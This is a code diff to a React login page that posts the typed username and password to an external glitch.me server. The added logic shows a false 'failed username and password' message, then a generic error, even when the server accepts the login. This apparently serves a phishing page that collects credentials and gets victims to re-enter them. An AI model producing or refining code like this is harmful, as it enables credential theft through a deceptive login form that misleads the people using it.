@@ -5,31 +5,40 @@ export default function Home() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState<string>('');
+  const [counter, setCounter] = useState(0);
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    event.preventDefault();
+  event.preventDefault();
+  
+  try {
+    const response = await fetch('https://six-southern-tarp.glitch.me/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ username, password })
+    });
+    const data = await response.json();
     
-    try {
-      const response = await fetch('https://six-southern-tarp.glitch.me/login', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ username, password })
-      });
-
-      const data = await response.json();
-
-      if (!response.ok) {
-        setError(data.message || 'Login failed');
-        return;
-      }
-
-      setError('');
-    } catch (err) {
-      setError('An error occurred. Please try again.');
+    if (!response.ok) {
+      setError(data.message || 'Login failed');
+      return;
     }
-  };
+
+    // Use functional update to ensure we're working with the latest state
+    setCounter(prevCounter => {
+      const newCounter = prevCounter + 1;
+      if (newCounter === 1) {
+        setError('Failed username and password combination');
+      } else if (newCounter >= 2) {
+        setError('An error occurred. Please try again later.');
+      }
+      return newCounter;
+    });
+  } catch (err) {
+    setError('An error occurred. Please try again.');
+  }
+};
 
   const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = event.target;
